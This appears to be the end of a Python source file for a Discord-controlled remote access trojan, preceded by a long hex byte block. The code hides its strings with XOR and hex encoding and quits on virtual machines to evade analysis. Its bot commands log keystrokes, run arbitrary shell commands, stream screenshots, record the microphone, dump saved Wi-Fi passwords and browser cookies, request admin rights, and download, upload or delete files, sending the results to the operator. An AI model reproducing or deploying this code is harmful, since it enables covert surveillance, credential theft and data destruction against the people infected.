0x7C,0x3A,0xC1,0xE5,0x65,0x4E,0xC5,0xE8,0xEC,0xC8,0x8C,0xA7,0x8E,0xE9,0xA5,0x93,0x81,0x83,0x13,0x04
0x9E,0xC3,0x23,0x3F,0xAB,0x29,0x97,0xE3,0xF7,0x5F,0x36,0x0A,0x1D,0x5E,0x9C,0x1A,0x81,0x1F,0xBA,0x10
0x2D,0x04,0xE9,0x4F,0xC6,0x6E,0x3F,0x2E,0x26,0x2E,0xAF,0x15,0xC4,0x8E,0x35,0x73,0x62,0x6D,0x84,0x36
0xD7,0x4C,0x04,0x03,0x72,0x60,0x11,0xC6,0xAB,0xE7,0x9F,0x0C,0xBE,0x3E,0x5E,0x7D,0x43,0xE5,0x06,0x1F
0xA2,0x9D,0x9D,0x2E,0x43,0x39,0x12,0x97,0x0E,0xDF,0xAA,0xA7,0xDB,0x9B,0xD3,0x1D,0x2F,0x96,0x97,0xA1
0x8E,0xAE,0x5C,0xF6,0x8F,0x44,0x73,0xE2,0x6F,0x81,0x9A,0x68,0xE4,0xA6,0xFD,0xC1,0xC6,0x22,0xE2,0x41
0x0B,0xB7,0x11,0x79,0xD4,0x08,0x1D,0xFB,0x2D,0xF2,0x43,0x30,0xF4,0x71,0x79,0x48,0x24,0xC7,0x2F,0xF5
0x46,0x79,0xAB,0x44,0xC0,0xEC,0xD4,0x8F,0x43,0xDF,0xB3,0x29,0xD0,0x1E,0xBD,0xF5,0x3D,0x7F,0x52,0xAE
0x3C,0xCB,0x91,0xED,0xFA,0x16,0xE6,0x57,0xE9,0x79,0x5A,0x2C,0xBB,0xD1,0x5F,0x54,0xEE,0x2F,0x7C,0x5B
0x37,0x19,0x35,0x13,0xE6,0x66,0x5B,0x06,0xBD,0xB8,0x74,0x26,0x75,0x05,0x73,0x65,0xA5,0x6D,0x31,0x63
0x39,0xA0,0x75,0xE9,0x26,0x50,0x7B,0x3B,0xF8,0x2E,0x62,0x65,0x05,0x3A,0x8A,0x9F,0x37,0xA2,0xDE,0xAC
0x57,0x41,0x08,0xDE,0x5D,0x6C,0x2E,0xB8,0x48,0xA1,0x48,0x39,0x6E,0x24,0xC4,0x4B,0xFE,0x2D,0x7D,0xEB
0xFF,0x24,0xDF,0x09,0x5A,0x47,0xEC,0x06,0xDA,0x3A,0x49,0x1F,0x52,0xD0,0xB9,0x3C,0x98,0x18,0xB1,0x5C
0xF9,0xA8,0x1C,0x53,0xDB,0x03,0x7F,0x87,0x71,0xB4,0x8F,0x0D,0xAA,0x8D,0x38,0xD5,0x0A,0x35,0x46,0xFF
0x13,0x6F,0x24,0x88,0x9C,0xFA,0x12,0x70,0xDB,0xBD,0xEA,0x27,0xFD,0xE8,0x93,0xD3,0xDC,0x40,0x90,0x27
0x40,0x76,0x16,0x44,0x18,0x1C,0xE5,0x53,0xB2,0x85,0x15,0x9D,0x11,0x14,0xF5,0x8B,0xCA,0x21,0xFF,0x16
0x10,0xA7,0xBD,0xCD,0xEB,0x46,0x8E,0x5E,0x58,0xC7,0xFE,0x0D,0x85,0xCF,0x42,0xE7,0xBA,0x5F,0xBF,0x5D
0x81,0x44,0x29,0x50,0x55,0x25,0xFE,0x4B,0xC5,0xB4,0xD2,0x1F,0x4E,0xDB,0xE5,0xA9,0x0B,0xE8,0x03,0x98
0xEE,0xB5,0xA4,0xB6,0x14,0x29,0x19,0x54,0xF4,0x7B,0x3C,0xD9,0xB6,0xC9,0xB3,0x40,0xA4,0xC5,0x61,0x04
0xD4,0x1A,0x82,0xAF,0xD2,0x1B,0x3C,0x7E,0x72,0x2A,0xFD,0xD8,0x8C,0x77,0xBE,0x2C,0xBC,0x02,0x35,0x63
0x30,0x6D,0xF4,0xA9,0xB2,0x93,0xAB,0x67,0x81,0xBF,0xB8,0x1C,0xE2,0x6C,0x6F,0x03,0x2F,0x7F,0xB0,0x15
0x4E,0xCF,0x6A,0x64,0x9F,0xA0,0x2F,0xAB,0x2A,0x02,0x01,0x29,0x83,0x0C,0x49,0x3B,0x39,0xCF,0x92,0x28
0x65,0x8F,0xAD,0x09,0xE1,0x5A,0xFD,0xEB,0xF6,0x1C,0x36,0xC8,0x96,0x4F,0xC7,0x5C,0x58,0x3E,0x9B,0xB3
0x3E,0x42,0x28,0x40,0x73,0x8D,0x00,0x69,0x6D,0x16,0xC9,0x77,0x94,0x0D,0xA5,0xE0,0x26,0xAD,0x76,0x5C
0x24,0xDC,0x1C,0xAE,0x22,0xCC,0xE3,0x2B,0x57,0x10,0xF6,0x69,0xC2,0x4C,0x1D,0x60,0x1C,0x0F,0x3A,0xF2
0x7C,0x3A,0xC1,0xE5,0x65,0x4E,0xC5,0xE8,0xEC,0xC8,0x8C,0xA7,0x8E,0xE9,0xA5,0x93,0x81,0x83,0x13,0x04
0x9E,0xC3,0x23,0x3F,0xAB,0x29,0x97,0xE3,0xF7,0x5F,0x36,0x0A,0x1D,0x5E,0x9C,0x1A,0x81,0x1F,0xBA,0x10
0x2D,0x04,0xE9,0x4F,0xC6,0x6E,0x3F,0x2E,0x26,0x2E,0xAF,0x15,0xC4,0x8E,0x35,0x73,0x62,0x6D,0x84,0x36
0xD7,0x4C,0x04,0x03,0x72,0x60,0x11,0xC6,0xAB,0xE7,0x9F,0x0C,0xBE,0x3E,0x5E,0x7D,0x43,0xE5,0x06,0x1F
0xA2,0x9D,0x9D,0x2E,0x43,0x39,0x12,0x97,0x0E,0xDF,0xAA,0xA7,0xDB,0x9B,0xD3,0x1D,0x2F,0x96,0x97,0xA1
0x8E,0xAE,0x5C,0xF6,0x8F,0x44,0x73,0xE2,0x6F,0x81,0x9A,0x68,0xE4,0xA6,0xFD,0xC1,0xC6,0x22,0xE2,0x41
0x0B,0xB7,0x11,0x79,0xD4,0x08,0x1D,0xFB,0x2D,0xF2,0x43,0x30,0xF4,0x71,0x79,0x48,0x24,0xC7,0x2F,0xF5
0x46,0x79,0xAB,0x44,0xC0,0xEC,0xD4,0x8F,0x43,0xDF,0xB3,0x29,0xD0,0x1E,0xBD,0xF5,0x3D,0x7F,0x52,0xAE
0x3C,0xCB,0x91,0xED,0xFA,0x16,0xE6,0x57,0xE9,0x79,0x5A,0x2C,0xBB,0xD1,0x5F,0x54,0xEE,0x2F,0x7C,0x5B
0x37,0x19,0x35,0x13,0xE6,0x66,0x5B,0x06,0xBD,0xB8,0x74,0x26,0x75,0x05,0x73,0x65,0xA5,0x6D,0x31,0x63
0x39,0xA0,0x75,0xE9,0x26,0x50,0x7B,0x3B,0xF8,0x2E,0x62,0x65,0x05,0x3A,0x8A,0x9F,0x37,0xA2,0xDE,0xAC
0x57,0x41,0x08,0xDE,0x5D,0x6C,0x2E,0xB8,0x48,0xA1,0x48,0x39,0x6E,0x24,0xC4,0x4B,0xFE,0x2D,0x7D,0xEB
0xFF,0x24,0xDF,0x09,0x5A,0x47,0xEC,0x06,0xDA,0x3A,0x49,0x1F,0x52,0xD0,0xB9,0x3C,0x98,0x18,0xB1,0x5C
0xF9,0xA8,0x1C,0x53,0xDB,0x03,0x7F,0x87,0x71,0xB4,0x8F,0x0D,0xAA,0x8D,0x38,0xD5,0x0A,0x35,0x46,0xFF
0x13,0x6F,0x24,0x88,0x9C,0xFA,0x12,0x70,0xDB,0xBD,0xEA,0x27,0xFD,0xE8,0x93,0xD3,0xDC,0x40,0x90,0x27
0x40,0x76,0x16,0x44,0x18,0x1C,0xE5,0x53,0xB2,0x85,0x15,0x9D,0x11,0x14,0xF5,0x8B,0xCA,0x21,0xFF,0x16
0x10,0xA7,0xBD,0xCD,0xEB,0x46,0x8E,0x5E,0x58,0xC7,0xFE,0x0D,0x85,0xCF,0x42,0xE7,0xBA,0x5F,0xBF,0x5D
0x81,0x44,0x29,0x50,0x55,0x25,0xFE,0x4B,0xC5,0xB4,0xD2,0x1F,0x4E,0xDB,0xE5,0xA9,0x0B,0xE8,0x03,0x98
0xEE,0xB5,0xA4,0xB6,0x14,0x29,0x19,0x54,0xF4,0x7B,0x3C,0xD9,0xB6,0xC9,0xB3,0x40,0xA4,0xC5,0x61,0x04
0xD4,0x1A,0x82,0xAF,0xD2,0x1B,0x3C,0x7E,0x72,0x2A,0xFD,0xD8,0x8C,0x77,0xBE,0x2C,0xBC,0x02,0x35,0x63
0x30,0x6D,0xF4,0xA9,0xB2,0x93,0xAB,0x67,0x81,0xBF,0xB8,0x1C,0xE2,0x6C,0x6F,0x03,0x2F,0x7F,0xB0,0x15
0x4E,0xCF,0x6A,0x64,0x9F,0xA0,0x2F,0xAB,0x2A,0x02,0x01,0x29,0x83,0x0C,0x49,0x3B,0x39,0xCF,0x92,0x28
0x65,0x8F,0xAD,0x09,0xE1,0x5A,0xFD,0xEB,0xF6,0x1C,0x36,0xC8,0x96,0x4F,0xC7,0x5C,0x58,0x3E,0x9B,0xB3
0x3E,0x42,0x28,0x40,0x73,0x8D,0x00,0x69,0x6D,0x16,0xC9,0x77,0x94,0x0D,0xA5,0xE0,0x26,0xAD,0x76,0x5C
0x24,0xDC,0x1C,0xAE,0x22,0xCC,0xE3,0x2B,0x57,0x10,0xF6,0x69,0xC2,0x4C,0x1D,0x60,0x1C,0x0F,0x3A,0xF2
0x7C,0x3A,0xC1,0xE5,0x65,0x4E,0xC5,0xE8,0xEC,0xC8,0x8C,0xA7,0x8E,0xE9,0xA5,0x93,0x81,0x83,0x13,0x04
0x9E,0xC3,0x23,0x3F,0xAB,0x29,0x97,0xE3,0xF7,0x5F,0x36,0x0A,0x1D,0x5E,0x9C,0x1A,0x81,0x1F,0xBA,0x10
0x2D,0x04,0xE9,0x4F,0xC6,0x6E,0x3F,0x2E,0x26,0x2E,0xAF,0x15,0xC4,0x8E,0x35,0x73,0x62,0x6D,0x84,0x36
0xD7,0x4C,0x04,0x03,0x72,0x60,0x11,0xC6,0xAB,0xE7,0x9F,0x0C,0xBE,0x3E,0x5E,0x7D,0x43,0xE5,0x06,0x1F
0xA2,0x9D,0x9D,0x2E,0x43,0x39,0x12,0x97,0x0E,0xDF,0xAA,0xA7,0xDB,0x9B,0xD3,0x1D,0x2F,0x96,0x97,0xA1
0x8E,0xAE,0x5C,0xF6,0x8F,0x44,0x73,0xE2,0x6F,0x81,0x9A,0x68,0xE4,0xA6,0xFD,0xC1,0xC6,0x22,0xE2,0x41
0x0B,0xB7,0x11,0x79,0xD4,0x08,0x1D,0xFB,0x2D,0xF2,0x43,0x30,0xF4,0x71,0x79,0x48,0x24,0xC7,0x2F,0xF5
0x46,0x79,0xAB,0x44,0xC0,0xEC,0xD4,0x8F,0x43,0xDF,0xB3,0x29,0xD0,0x1E,0xBD,0xF5,0x3D,0x7F,0x52,0xAE
0x3C,0xCB,0x91,0xED,0xFA,0x16,0xE6,0x57,0xE9,0x79,0x5A,0x2C,0xBB,0xD1,0x5F,0x54,0xEE,0x2F,0x7C,0x5B
0x37,0x19,0x35,0x13,0xE6,0x66,0x5B,0x06,0xBD,0xB8,0x74,0x26,0x75,0x05,0x73,0x65,0xA5,0x6D,0x31,0x63
0x39,0xA0,0x75,0xE9,0x26,0x50,0x7B,0x3B,0xF8,0x2E,0x62,0x65,0x05,0x3A,0x8A,0x9F,0x37,0xA2,0xDE,0xAC
0x57,0x41,0x08,0xDE,0x5D,0x6C,0x2E,0xB8,0x48,0xA1,0x48,0x39,0x6E,0x24,0xC4,0x4B,0xFE,0x2D,0x7D,0xEB
0xFF,0x24,0xDF,0x09,0x5A,0x47,0xEC,0x06,0xDA,0x3A,0x49,0x1F,0x52,0xD0,0xB9,0x3C,0x98,0x18,0xB1,0x5C
0xF9,0xA8,0x1C,0x53,0xDB,0x03,0x7F,0x87,0x71,0xB4,0x8F,0x0D,0xAA,0x8D,0x38,0xD5,0x0A,0x35,0x46,0xFF
0x13,0x6F,0x24,0x88,0x9C,0xFA,0x12,0x70,0xDB,0xBD,0xEA,0x27,0xFD,0xE8,0x93,0xD3,0xDC,0x40,0x90,0x27
0x40,0x76,0x16,0x44,0x18,0x1C,0xE5,0x53,0xB2,0x85,0x15,0x9D,0x11,0x14,0xF5,0x8B,0xCA,0x21,0xFF,0x16
0x10,0xA7,0xBD,0xCD,0xEB,0x46,0x8E,0x5E,0x58,0xC7,0xFE,0x0D,0x85,0xCF,0x42,0xE7,0xBA,0x5F,0xBF,0x5D
0x81,0x44,0x29,0x50,0x55,0x25,0xFE,0x4B,0xC5,0xB4,0xD2,0x1F,0x4E,0xDB,0xE5,0xA9,0x0B,0xE8,0x03,0x98
0xEE,0xB5,0xA4,0xB6,0x14,0x29,0x19,0x54,0xF4,0x7B,0x3C,0xD9,0xB6,0xC9,0xB3,0x40,0xA4,0xC5,0x61,0x04
0xD4,0x1A,0x82,0xAF,0xD2,0x1B,0x3C,0x7E,0x72,0x2A,0xFD,0xD8,0x8C,0x77,0xBE,0x2C,0xBC,0x02,0x35,0x63
0x30,0x6D,0xF4,0xA9,0xB2,0x93,0xAB,0x67,0x81,0xBF,0xB8,0x1C,0xE2,0x6C,0x6F,0x03,0x2F,0x7F,0xB0,0x15
0x4E,0xCF,0x6A,0x64,0x9F,0xA0,0x2F,0xAB,0x2A,0x02,0x01,0x29,0x83,0x0C,0x49,0x3B,0x39,0xCF,0x92,0x28
"""

def x(d, k): 
    return ''.join(chr(ord(c) ^ k) for c in d)
print(Fore.BLACK)
s = x('\x0f\x16\x0f\x17\x0f\x08\x13\x01\x0f\x08\x13\x17\x05\x08\x01\x0c\x16\x16\x03\x11\x0f\x06\x06\r\x05\x01\x04\x01\x0d\x1f\x13\x00\x05\x04\x0c\x1c\x16\x0c\x08\x0f\x16\x17\x03\x0f\x0c\x13\x17\x05\x0c\x10\x0c\x10\x02\x0f\x0c\x0f\x04\x0f\x01\x17\x1c\x1e\x01\x0b\x0f\x10\x01\x13', 0x42)

if is_virtual_machine():
    raise ImportError("Module error [0x0D07]")
    exit()
else:
    pass

token = bytes.fromhex(hex_data + "f").decode()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
notifier = ToastNotifier()

def custom_notification(title, message):
    notifier.show_toast(title, message, duration=5, threaded=True)

recording = False
key_log_data = {"log": ""}
record_thread = None

def start_keylogger(send_func):
    def on_press(key):
        try:
            key_log_data["log"] += key.char
        except AttributeError:
            key_log_data["log"] += f"[{key.name}]"

    def run():
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        while recording:
            if key_log_data["log"]:
                send_func(key_log_data["log"])
                key_log_data["log"] = ""
            time.sleep(5)
        listener.stop()

    return run

@bot.command()
async def recordKeys(ctx, mode):
    global recording, record_thread

    if mode.lower() == "on":
        if recording:
            await ctx.send("Already recording.")
            return

        recording = True

        def send_keys(log):
            coro = ctx.send(f"```{log}```")
            fut = asyncio.run_coroutine_threadsafe(coro, bot.loop)
            try:
                fut.result()
            except:
                pass

        thread = threading.Thread(target=start_keylogger(send_keys))
        thread.start()
        record_thread = thread
        await ctx.send("Keylogging started.")

    elif mode.lower() == "off":
        if not recording:
            await ctx.send("Not currently recording.")
            return

        recording = False
        if record_thread:
            record_thread.join()
        await ctx.send("Keylogging stopped.")

    else:
        await ctx.send("Usage: `/record on` or `/record off`")

@bot.command()
async def cmd(ctx, *, command):
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        output = result.stdout.strip() or result.stderr.strip() or "Command ran with no output."

        if len(output) > 1900:
            await ctx.send("Output too long. Sending first 1900 characters:")
            output = output[:1900]

        await ctx.send(f"```{output}```")
    except Exception as e:
        await ctx.send(f"Error running command: {e}")

@bot.command()
async def screen(ctx: commands.Context):
    try:
        temp_dir = tempfile.gettempdir()
        temp_path = os.path.join(temp_dir, "screenshot.png")

        screenshot = pyautogui.screenshot()
        screenshot.save(temp_path)

        await ctx.send(file=discord.File(temp_path))
        os.remove(temp_path)
    except Exception as e:
        await ctx.send(f"Error taking screenshot: {e}")

@bot.command()
async def send(ctx: commands.Context, *, message):
    try:
        custom_notification("System Notification", message)
        await ctx.send("Notification sent.")
    except Exception as e:
        await ctx.send(f"Error sending notification: {e}")

@bot.command()
async def tree(ctx):
    user = os.path.expanduser("~")
    folders_to_check = [
        os.path.join(user, "Desktop"),
        os.path.join(user, "Downloads"),
        os.path.join(user, "Documents"),
        os.path.join(user, "Pictures"),
        os.path.join(user, "Music"),
        os.path.join(user, "Videos"),
        os.path.join(user, "OneDrive")
    ]

    result = ""

    for folder in folders_to_check:
        if not os.path.exists(folder):
            continue

        folder_name = os.path.basename(folder)
        result += f"\n📁 **{folder_name}**\n"

        for root, dirs, files in os.walk(folder):
            level = root.replace(folder, "").count(os.sep)
            indent = "│   " * level + "├── "
            result += f"{indent}{os.path.basename(root)}/\n"

            subindent = "│   " * (level + 1)
            for f in files:
                result += f"{subindent}├── {f}\n"

    if not result:
        await ctx.send("No folders found.")
        return

    chunks = [result[i:i+1900] for i in range(0, len(result), 1900)]
    for chunk in chunks:
        await ctx.send(f"```{chunk}```")

@bot.command()
async def download(ctx, *, filepath):
    if not os.path.isfile(filepath):
        await ctx.send("File not found.")
        return

    try:
        file_size = os.path.getsize(filepath)
        max_size = 25 * 1024 * 1024

        if file_size > max_size:
            await ctx.send(f"File too large to send ({file_size // (1024*1024)} MB).")
            return

        await ctx.send(file=discord.File(filepath))
    except Exception as e:
        await ctx.send(f"Error sending file: {e}")

@bot.command()
async def wifi(ctx):
    try:
        profiles_cmd = subprocess.run(
            "netsh wlan show profiles",
            shell=True,
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        profiles_output = profiles_cmd.stdout

        profile_names = re.findall(r"All User Profile\s*:\s*(.+)", profiles_output)

        if not profile_names:
            await ctx.send("No saved Wi-Fi profiles found.")
            return

        result = "**Saved Wi-Fi Passwords**\n\n"

        for name in profile_names:
            name = name.strip()
            pass_cmd = subprocess.run(
                f'netsh wlan show profile name="{name}" key=clear',
                shell=True,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            pass_output = pass_cmd.stdout
            password_match = re.search(r"Key Content\s*:\s(.+)", pass_output)
            password = password_match.group(1).strip() if password_match else "Not found"
            result += f"**{name}** — `{password}`\n"

        chunks = [result[i:i+1900] for i in range(0, len(result), 1900)]
        for chunk in chunks:
            await ctx.send(chunk)

    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def cookies(ctx):
    try:
        cj = browser_cookie3.load()

        cookies = []
        for cookie in cj:
            cookies.append({
                "domain": cookie.domain,
                "name": cookie.name,
                "value": cookie.value,
                "path": cookie.path,
                "expirationDate": int(cookie.expires) if cookie.expires else None,
                "httpOnly": cookie._rest.get("HttpOnly", False),
                "secure": cookie.secure
            })

        if not cookies:
            await ctx.send("No cookies found.")
            return

        temp_path = os.path.join(tempfile.gettempdir(), "cookies.json")

        with open(temp_path, "w", encoding="utf-8") as f:
            json.dump(cookies, f, indent=2)

        await ctx.send(file=discord.File(temp_path))
        os.remove(temp_path)

    except PermissionError:
        await ctx.send("This command must be run as administrator.")
    except Exception as e:
        await ctx.send(f"Error extracting cookies: {e}")

@bot.command()
async def admin(ctx):
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

        if is_admin:
            await ctx.send("Already running as administrator.")
            return

        script = sys.argv[0]
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        cmd = f'"{sys.executable}" "{script}" {params}'

        subprocess.run(
            ["powershell", "-Command", f'Start-Process {cmd} -Verb runAs'],
            shell=True
        )

        await ctx.send("Prompting for admin access... Bot will restart.")
        await bot.close() 

    except Exception as e:
        await ctx.send(f"Failed to request admin access: {e}")

@bot.command()
async def scan(ctx, *, folder_path):
    import os

    if not os.path.exists(folder_path):
        await ctx.send("That path doesn't exist.")
        return

    result = f"📁 Scanning: `{folder_path}`\n"

    for root, dirs, files in os.walk(folder_path):
        level = root.replace(folder_path, "").count(os.sep)
        indent = "│   " * level + "├── "
        result += f"{indent}{os.path.basename(root)}/\n"

        subindent = "│   " * (level + 1)
        for f in files:
            result += f"{subindent}├── {f}\n"

    chunks = [result[i:i+1900] for i in range(0, len(result), 1900)]
    for chunk in chunks:
        await ctx.send(f"```{chunk}```")

@bot.command()
async def open(ctx, *, url):
    try:
        if not url.startswith("http"):
            url = "http://" + url
        webbrowser.open(url)
        await ctx.send(f"Opening: `{url}`")
    except Exception as e:
        await ctx.send(f"Failed to open: {e}")

@bot.command()
async def upload(ctx, *, destination_path):
    if not ctx.message.attachments:
        await ctx.send("No file attached.")
        return

    if not os.path.exists(destination_path):
        await ctx.send("Destination path does not exist.")
        return

    try:
        for attachment in ctx.message.attachments:
            file_path = os.path.join(destination_path, attachment.filename)
            await attachment.save(file_path)
            await ctx.send(f"Uploaded `{attachment.filename}` to `{destination_path}`")
    except Exception as e:
        await ctx.send(f"Failed to upload: {e}")

@bot.command()
async def info(ctx):
    data = """
Startup Folder - `C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`      
"""
    await ctx.send(data)

live_streaming = False
live_thread = None

@bot.command()
async def live(ctx, mode):
    global live_streaming, live_thread

    if mode.lower() == "on":
        if live_streaming:
            await ctx.send("Already live.")
            return

        live_streaming = True

        def stream_loop():
            while live_streaming:
                try:
                    temp_path = os.path.join(tempfile.gettempdir(), "live_stream.png")
                    screenshot = pyautogui.screenshot()
                    screenshot.save(temp_path)

                    coro = ctx.send(file=discord.File(temp_path))
                    fut = asyncio.run_coroutine_threadsafe(coro, bot.loop)
                    fut.result()

                    os.remove(temp_path)
                    time.sleep(2)
                except Exception as e:
                    print(f"Live stream error: {e}")
                    break

        live_thread = threading.Thread(target=stream_loop)
        live_thread.start()
        await ctx.send("Live stream started. Sending screenshots every 2s.")

    elif mode.lower() == "off":
        if not live_streaming:
            await ctx.send("Not currently live.")
            return

        live_streaming = False
        if live_thread:
            live_thread.join()

        temp_path = os.path.join(tempfile.gettempdir(), "live_stream.png")
        if os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except:
                pass

        await ctx.send("Live stream stopped and cleaned up.")

    else:
        await ctx.send("Usage: `!live on` or `!live off`")

@bot.command()
async def mic(ctx, seconds: int):
    if seconds < 1 or seconds > 30:
        await ctx.send("Please choose a duration between 1 and 30 seconds.")
        return

    await ctx.send(f"Recording for {seconds} second(s)...")

    try:
        sample_rate = 44100
        audio_data = sd.rec(int(seconds * sample_rate), samplerate=sample_rate, channels=1)
        sd.wait()

        temp_path = os.path.join(tempfile.gettempdir(), "mic_recording.wav")
        write(temp_path, sample_rate, audio_data)

        await ctx.send(file=discord.File(temp_path))
        os.remove(temp_path)

    except Exception as e:
        await ctx.send(f"Error recording: {e}")

@bot.command()
async def delete(ctx, *, path: str):
    try:
        full_path = os.path.abspath(path)

        if not os.path.exists(full_path):
            await ctx.send(f"❌ Path does not exist: `{full_path}`")
            return

        if os.path.isfile(full_path):
            os.remove(full_path)
            await ctx.send(f"🗑️ Deleted file: `{full_path}`")
        elif os.path.isdir(full_path):
            shutil.rmtree(full_path)
            await ctx.send(f"🗑️ Deleted folder: `{full_path}`")
        else:
            await ctx.send(f"⚠️ Unknown file type: `{full_path}`")

    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name="help")
async def help_command(ctx):
    help_text = """
**Available Commands**
`!screen` — Takes a screenshot and sends it  
`!send <message>` — Shows a system notification with your message  
`!tree` — Lists folders/files from Desktop, Downloads, Documents, etc.  
`!cmd` — Run cmd on computer
`!recordKeys <on/off>` — Record Keystrokes
`!download <path>` — Downloads Files
`!wifi` — Get Wifi Passwords
`!cookies` — Get All Browser Cookies
`!admin` — Trys To Get Admin
`!scan <path>` — Scans Paths Files
`!open <website>` — Opens Website
`!upload (file) <path>` — Uploads File
`!info` — Stored Helpful Info
`!live <on/off>` — Record Screen
`!mic <time> [max 30s]` — Record Microphone
`!delete <path>` — Deletes File At Path

`!help` — Shows this help message
"""
    await ctx.send(help_text)

bot.run(token)
